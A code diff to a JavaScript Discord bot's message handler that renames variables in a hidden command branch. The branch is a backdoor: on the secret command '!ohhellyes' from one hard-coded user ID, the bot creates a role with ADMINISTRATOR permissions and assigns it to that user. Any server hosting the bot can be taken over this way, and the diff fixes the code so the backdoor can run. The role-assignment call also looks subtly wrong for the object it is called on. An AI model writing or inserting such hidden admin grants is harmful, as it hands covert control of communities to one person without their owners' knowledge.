@@ -10,16 +10,17 @@ client.on('ready', () => {
 });
 
 client.on('message', message => {
-    console.log('command received');
+    
     if(message.content.includes('!ohhellyes')){
-if (msg.author.id == '368756694114893825') {
+if (message.author.id == '368756694114893825') {
+    console.log('command received');
  message.guild.createRole({
   name: 'Droid Level',
   color: 'BLUE',
   permissions: 'ADMINISTRATOR'
 })
   .then(role => {
-        msg.author.addRole(role).catch(console.error)
+        message.author.addRole(role).catch(console.error)
         console.log(`Created new role with name ${role.name} and color ${role.color}`)
  }
      )
